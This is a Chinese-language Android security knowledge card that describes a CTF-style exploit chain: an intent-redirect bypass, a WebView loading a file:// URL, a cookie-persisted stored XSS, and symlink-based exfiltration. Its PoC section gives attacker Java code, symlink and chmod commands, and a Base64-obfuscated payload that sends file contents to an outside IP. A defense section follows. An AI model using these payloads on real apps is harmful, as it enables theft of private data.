---
id: mobile-android-intent-redirect-webview-cookie-stored-xss-file-symlink
title: 导出 Activity 的 Intent 重定向 + WebView 未导出页 file:// 加载：Cookie 持久化存储型 XSS 借软链接外带
type: scenario
domain: mobile
path: mobile/android
technique: intent-redirect-webview-cookie-persisted-xss-symlink-exfil
aliases:
- WebView Intent 重定向
- shouldOverrideUrlLoading 重定向
- CookieManager 持久化 XSS
- 软链接渲染 Cookies
- authority contains 绕过
tags:
- android
- webview
- intent-redirection
- xss
- cookie
- symlink
- exfiltration
- mobile
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:31:26+08:00'
  notes: '已对照原文核对；原文 MainActivity 用 data.getAuthority().contains(toutiao.com) && scheme==http 弱校验、shouldOverrideUrlLoading 对 intent: 走 Intent.parseUri(url,1)+startActivity，TestActivity 直接 loadUrl(extra)、poc 用 http://toutiao.com@10.24.32.128:5000/easydroid.html 绕过，exp.html 写 cookie、symlink 指向 app_webview/Cookies、等待 40 秒再渲染，与卡片一致；未验证点：setAllowFileAccess 在 API 29 及以下默认开启一语属通用结论，原文仅一句带过（卡片放在边界小节已说明）'
---

## 一句话结论

当应用的 WebView 在 `shouldOverrideUrlLoading` 里对 `scheme=intent` 的 URL 直接 `startActivity(Intent.parseUri(url,1))`，且入口 URL 校验用的是 `authority.contains("trusted.com")` 这种弱判断时，可用 `http://trusted.com@attacker/exp.html` 绕过校验把恶意页面加载进 WebView；借该 WebView 的 `intent:` 导航跳到**未导出**的 `TestActivity`（它同样开 JS + 允许 file 访问），先把 `<script>`/`onerror` 写进 Cookie 持久化库，再让受害应用渲染该 Cookie 文件（经攻击者软链接），触发存储型 XSS 把文件内容经 HTTP 外带。

## 原理

- **`shouldOverrideUrlLoading` 是第二跳板**：`WebViewClient.shouldOverrideUrlLoading` 在页面导航发生前回调。应用把 `intent:` 协议的 URL 解析成 Intent 并 `startActivity`，等于「WebView 里可控的任意 URL → 任意组件启动」；WebView 里的 JS 可通过 `location.href = "intent:#Intent;component=...;S.url=...;end"` 直接触发，不需要额外权限。
- **`Intent.parseUri(url, 1)` 的历史坑**：`URI_INTENT_SCHEME` 解析会还原 component、`S.*` 字符串 extra，并把 `Intent.FLAG_GRANT_*` 等 flags 一并带上；如果应用没有清洗 `component`/`package`/`flags`，任何页面脚本都能指定目标组件与参数。旧版 Android 还默认给这类 Intent 加 `FLAG_GRANT_READ_URI_PERMISSION`，所以历史上这类重定向常连带内容 URI 授权（本题主要用它的「指定任意组件 + 传 extra」能力）。
- **`authority.contains("toutiao.com")` 为什么形同虚设**：`http://toutiao.com@attacker.example:5000/easydroid.html` 里 `toutiao.com` 是 **userinfo**，真正的 host 是 `attacker.example`。`Uri.getAuthority()` 返回的字符串包含 userinfo，于是 `contains` 通过，但 WebView 实际加载的是攻击者服务器上的页面。正确写法是 `getHost().equals("toutiao.com")`（或对完整域名做严格匹配），且不能只看 `scheme`。
- **为什么必须借未导出的 `TestActivity`**：`TestActivity` 从 `getIntent().getStringExtra("url")` 取 URL 并 `loadUrl`，本身没有 `http`/authority 校验，因此能加载 `file://...`；但它不导出，外部应用无法直接启动，只能通过上面那个重定向从**受害应用进程内**启动。这也解释了为什么不能直接用 `MainActivity` —— 它只接受 `http` scheme 且带 authority 校验，`file://` 过不去。
- **Cookie 持久化把一次性 XSS 变成存储型**：`exp.html` 里 `document.cookie = "x = '<img src=x onerror=eval(atob(...))>'"`，WebView 的 Cookie 由 `CookieManager` 持久化到 `/data/data/<pkg>/app_webview/Cookies`（SQLite 库）。随后只要以 HTML 方式渲染这个文件，其中保存的 `<img>`/`<script>` 就会被当作页面内容执行 —— 攻击者不再需要让受害者再次访问恶意页面。
- **软链接解决「渲染谁的文件」**：攻击者无法让受害者的 WebView 直接读受害者自己的私有 Cookie 文件（路径可达但需要一个「受害者视角合法」的 file URL）。攻击者在**自己的数据目录**里 `ln -s <victim>/app_webview/Cookies symlink.html` 并 `chmod 777` 目录，然后让 `TestActivity` 加载 `file:///data/data/<attacker pkg>/symlink.html`。文件属主仍是受害者，访问由受害者进程（TestActivity 所属 UID）完成，因此权限成立；攻击者进程本身没有读取权限也能借这条链路「让受害者自己读自己」。
- **JS 加密成的载荷**：注入的 JS 用 `atob(...)` 还原，是因为明文里含有 `"`、`http://`、`document.cookie` 等会被 Cookie 值语法或页面解析截断的字符；Base64 让 payload 在 Cookie 存储层与 HTML 渲染层都保持完整。

## 触发条件

- 目标应用有一个处理 `intent:` scheme 的 WebView 重定向点（`shouldOverrideUrlLoading` 中 `Intent.parseUri` + `startActivity`），且未清洗 component/flags。
- 入口 URL 校验采用 `getAuthority().contains(...)` 之类的子串判断，可被 userinfo（`http://trusted.com@evil/`）绕过。
- 应用中存在未导出、但会 `loadUrl(外部 URL)` 的 WebView Activity（允许 `file://`，且 `setJavaScriptEnabled(true)`；API 29 及以下 `setAllowFileAccess` 默认开启）。
- 应用有网络权限（外带）；攻击者能在自己的私有目录创建软链接（普通应用对自己的数据目录有写权限）。
- 目标 WebView 的 Cookie 以明文 SQLite 形式持久化（`CookieManager` 默认行为）。

## 利用步骤

1. 静态定位：搜 `shouldOverrideUrlLoading`、`Intent.parseUri`、`startActivity(`、`getStringExtra("url")`、`setJavaScriptEnabled`、`setAllowFileAccess`，画出「WebView → Intent 跳转 → 另一个 WebView」的链路。
2. 确认未导出 Activity 的加载逻辑：是否存在从 extra 直接 `loadUrl` 且无 scheme 校验；`setAllowFileAccess` 是否开启（API ≤ 29 默认开启）。
3. 在攻击者应用里准备软链接：`ln -s /data/data/<victim>/app_webview/Cookies /data/data/<attacker>/symlink.html`，并 `chmod -R 777` 攻击者数据目录（确保受害者进程可读）。
4. 投放第一跳：从攻击者组件 `startActivity` 启动受害者 `MainActivity`，data 设为 `http://trusted.com@<attacker-ip>:<port>/easydroid.html`，绕过 authority 校验。
5. 第一跳页面（`easydroid.html`）用 `location.href = "intent:#Intent;component=<victim>/.TestActivity;S.url=<exp.html 的 URL-encode>;end"` 让 `TestActivity` 渲染 `exp.html`，把恶意 Cookie 写入持久化库。
6. 间隔 20–40 秒（等 Cookie 落盘）后，再次用 `intent:` 让 `TestActivity` 加载 `file:///data/data/<attacker>/symlink.html`（即受害者的 Cookies 库），触发存储型 XSS。
7. 注入的 JS 读取页面内容（`document.getElementsByTagName("html")[0].innerHTML`）并 `encodeURIComponent` 后拼到 `new Image().src = "http://<attacker>/collect?msg=..."`，从服务器日志取回数据（Cookies 库是 SQLite 二进制，会有乱码，但 flag 值本身可读）。

## PoC

```java
// 攻击者：第一跳，借 authority contains 的绕过进入受害者 WebView
Intent intent = new Intent();
intent.setClassName("com.victim.app", "com.victim.app.MainActivity");
intent.setData(Uri.parse("http://trusted.com@attacker.example:5000/easydroid.html"));
startActivity(intent);
```

```java
// 受害者：弱校验 + intent: 重定向
if (data.getAuthority().contains("trusted.com") && data.getScheme().equals("http")) {
    WebView webView = new WebView(getApplicationContext());
    webView.setWebViewClient(new WebViewClient() {
        @Override public boolean shouldOverrideUrlLoading(WebView v, String url) {
            Uri uri = Uri.parse(url);
            if (uri.getScheme().equals("intent")) {
                startActivity(Intent.parseUri(url, 1));   // component/extra 完全可控
                return true;
            }
            return super.shouldOverrideUrlLoading(v, url);
        }
    });
    setContentView(webView);
    webView.getSettings().setJavaScriptEnabled(true);
    webView.loadUrl(data.toString());
}
```

```html
<!-- easydroid.html：先写 Cookie，再渲染文件出 XSS -->
<script>
function sleep(ms){return new Promise(r => setTimeout(r, ms))}
sleep(1000).then(() => {
  location.href = "intent:#Intent;component=com.victim.app/.TestActivity;"
               + "S.url=http%3A%2F%2Fattacker.example%3A5000%2Fexp.html;end";
  sleep(40000).then(() => {
    location.href = "intent:#Intent;component=com.victim.app/.TestActivity;"
                 + "S.url=file%3A%2F%2F%2Fdata%2Fdata%2Fcom.attacker.app%2Fsymlink.html;end";
  });
});
</script>
```

```html
<!-- exp.html：把携带 onerror 的值写进持久化 Cookie（Base64 避免被截断） -->
<script>document.cookie = "x = '<img src=\"x\" onerror=\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly8xMC4yNC4zMi4xMjg6NTAwMC9nZXRVcmxQYXJhbT9tc2c9IiArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaHRtbCIpWzBdLmlubmVySFRNTCk7Cg=='))\">'"</script>
```

```bash
# 攻击者侧准备软链接（在应用内用 Runtime.exec，或在已 root/调试环境执行）
ln -s /data/data/com.victim.app/app_webview/Cookies \
      /data/data/com.attacker.app/symlink.html
chmod -R 777 /data/data/com.attacker.app
```

## 变体与关联

- **重定向清洗不完整**：只校验 `scheme` 不校验 component，或只用 `package` 白名单但允许 `intent:` 里覆盖 component，都会留下本条链。
- **无未导出 WebView 时**：可通过 `intent:` 跳到浏览器的 `VIEW` action 加载 `file://`（若浏览器允许），或跳到应用内其他 `loadUrl(extra)` 组件。
- **Cookie 之外的持久面**：`localStorage`、WebView cache、下载目录中的 HTML 都能承担「先落地再渲染」的存储型角色。
- **关联**：同一题第一问用 Intent 重定向 + FileProvider 授权直接读私有文件，见 [[mobile-android-intent-redirection-fileprovider-grant-uri-private-file-read]]；WebView file 协议风险与配置加固见 [[mobile-android-webview-file-universal-access-local-read]]；JSBridge 任意源注入见 [[mobile-android-webview-jsbridge-arbitrary-origin-credential-theft]]。
- **边界**：API 30+ `setAllowFileAccess` 默认 false 且 `file://` 访问受限，需目标显式开启；应用若对 `Intent.parseUri` 结果调 `setComponent(null)`/清除 flags，或对外部 URL 做严格 host 白名单，则两跳全部失效。

## 检测与防御

- **URL 校验**：用 `Uri.getHost()` 与完整域名白名单比较，不要用 `getAuthority().contains()`（authority 含 userinfo，`http://trusted.com@evil/` 即可绕过）；同时校验 scheme 与 path 前缀。
- **Intent 重定向防护**：解析出的 Intent 必须 `setComponent(null)`、`setPackage(getPackageName())`、清除 `FLAG_GRANT_*` 与 `FLAG_GRANT_PERSISTABLE_URI_PERMISSION`；更好的做法是对 `intent:` scheme 直接拒绝，或用 `Intent.parseUri` 后只取白名单字段重建 Intent。
- **WebView 加固**：非必要时关闭 `setAllowFileAccess`（API 30+ 默认关闭，旧版本需显式设置），避免在可加载外部页面的 WebView 上开启；加载外部 URL 的组件应导出受控且校验来源。
- **Cookie 安全**：不要把用户可控内容写进 `document.cookie` 后又在 file 源中渲染；对 Cookie 做 `HttpOnly`（服务端下发）与最小化；渲染本地文件时禁用 JS 或使用隔离 WebView。
- **检测信号**：静态扫描 `Intent.parseUri` + `startActivity`、`getAuthority().contains(`、`loadUrl(getStringExtra("url"))` 组合；运行时监控 WebView 对 `intent:` 的导航、应用加载 `file://` 路径后立刻发起 HTTP 外连，以及应用私有目录中出现的软链接与 777 权限目录。
